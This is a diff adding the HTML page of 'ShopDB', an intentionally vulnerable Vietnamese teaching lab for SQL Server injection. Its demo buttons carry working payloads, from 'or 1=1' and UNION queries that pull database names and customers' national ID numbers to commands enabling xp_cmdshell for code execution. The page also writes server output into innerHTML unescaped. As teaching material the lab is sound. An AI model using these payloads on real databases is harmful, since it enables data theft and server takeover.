@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="vi">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="ShopDB Lab - SQL Injection Demo (Lab Chương 4)">
+  <title>ShopDB Lab — SQL Injection Demo</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+
+<body>
+
+  <!-- Navbar -->
+  <nav class="navbar">
+    <a href="/" class="logo">
+      <div class="logo-icon">S</div>
+      <span class="logo-text">ShopDB</span>
+    </a>
+    <span class="nav-badge">⚠ Vulnerable Demo</span>
+  </nav>
+
+  <!-- Main -->
+  <div class="container">
+
+    <!-- Hero -->
+    <section class="hero">
+      <h1>🛒 ShopDB — Lab Chương 2</h1>
+      <p>Web app demo lỗ hổng SQL Injection.<br>Tìm sản phẩm theo ID để xem kết quả truy vấn.</p>
+    </section>
+
+    <!-- Search -->
+    <section class="search-section">
+      <form class="search-box" id="searchForm" onsubmit="return searchProduct(event)">
+        <input type="text" id="searchInput" placeholder="Nhập Product ID  (vd: 1)" autocomplete="off">
+        <button type="submit">Tìm kiếm</button>
+      </form>
+    </section>
+
+    <!-- Product Grid -->
+    <section>
+      <div class="product-grid" id="productGrid">
+        <!-- Rendered by JS -->
+      </div>
+    </section>
+
+    <!-- Query Result -->
+    <section class="result-area" id="resultArea" style="display:none;">
+      <h2>📋 Kết quả truy vấn</h2>
+      <div class="result-box" id="resultBox"></div>
+    </section>
+
+    <!-- SQLi Demo -->
+    <section class="sqli-section">
+      <h2>🔓 SQLi Demo Payloads</h2>
+      <p>Thử các payload bên dưới để khai thác lỗ hổng SQL Injection trên bản <code>app.py</code> (vulnerable).</p>
+      <div class="sqli-buttons">
+        <a class="sqli-btn" onclick="tryPayload('1 or 1=1')">1 or 1=1</a>
+        <a class="sqli-btn" onclick="tryPayload('1 UNION SELECT 1,@@version,3')">UNION @@version</a>
+        <a class="sqli-btn" onclick="tryPayload('1 UNION SELECT 1,name,3 FROM sysdatabases')">UNION sysdatabases</a>
+        <a class="sqli-btn" onclick="tryPayload('1 UNION SELECT id,fullname,cccd FROM customers')">UNION customers</a>
+        <a class="sqli-btn" onclick="tryPayload('0; EXEC sp_configure \'show advanced options\',1; RECONFIGURE')">Enable
+          xp_cmdshell (1)</a>
+        <a class="sqli-btn" onclick="tryPayload('0; EXEC sp_configure \'xp_cmdshell\',1; RECONFIGURE')">Enable
+          xp_cmdshell (2)</a>
+      </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+      Lab Chương 4 — Database Security &middot; SQL Server SQLi → RCE
+    </footer>
+  </div>
+
+  <script>
+    // --- Default products to show ---
+    const defaultProducts = [
+      { id: 1, name: 'Bàn phím', price: 500000 },
+      { id: 2, name: 'Chuột', price: 250000 },
+      { id: 3, name: 'Màn hình', price: 3000000 }
+    ];
+
+    function formatVND(n) {
+      return n.toLocaleString('vi-VN') + ' ₫';
+    }
+
+    function renderProducts(products) {
+      const grid = document.getElementById('productGrid');
+      grid.innerHTML = products.map(p => `
+        <div class="product-card" onclick="tryPayload('${p.id}')">
+          <span class="product-id">ID #${p.id}</span>
+          <div class="product-name">${p.name}</div>
+          <div class="product-price">${formatVND(p.price)} <span>VNĐ</span></div>
+        </div>
+      `).join('');
+    }
+
+    // Render default products on load
+    renderProducts(defaultProducts);
+
+    // --- Search ---
+    async function searchProduct(e) {
+      if (e) e.preventDefault();
+      const pid = document.getElementById('searchInput').value.trim();
+      if (!pid) return false;
+      await fetchProduct(pid);
+      return false;
+    }
+
+    async function tryPayload(payload) {
+      document.getElementById('searchInput').value = payload;
+      await fetchProduct(payload);
+    }
+
+    async function fetchProduct(pid) {
+      const resultArea = document.getElementById('resultArea');
+      const resultBox = document.getElementById('resultBox');
+
+      resultArea.style.display = 'block';
+      resultBox.className = 'result-box';
+      resultBox.innerHTML = '<span class="spinner"></span> Đang truy vấn...';
+
+      try {
+        const resp = await fetch('/product?id=' + encodeURIComponent(pid));
+        const text = await resp.text();
+
+        if (text.toLowerCase().startsWith('sql error')) {
+          resultBox.className = 'result-box error';
+          resultBox.innerHTML = text;
+        } else {
+          resultBox.className = 'result-box success';
+          resultBox.innerHTML = text || '<em>Không có kết quả</em>';
+        }
+      } catch (err) {
+        resultBox.className = 'result-box error';
+        resultBox.innerHTML = 'Lỗi kết nối: ' + err.message;
+      }
+
+      // Scroll to result
+      resultArea.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    }
+  </script>
+
+</body>
+
+</html>
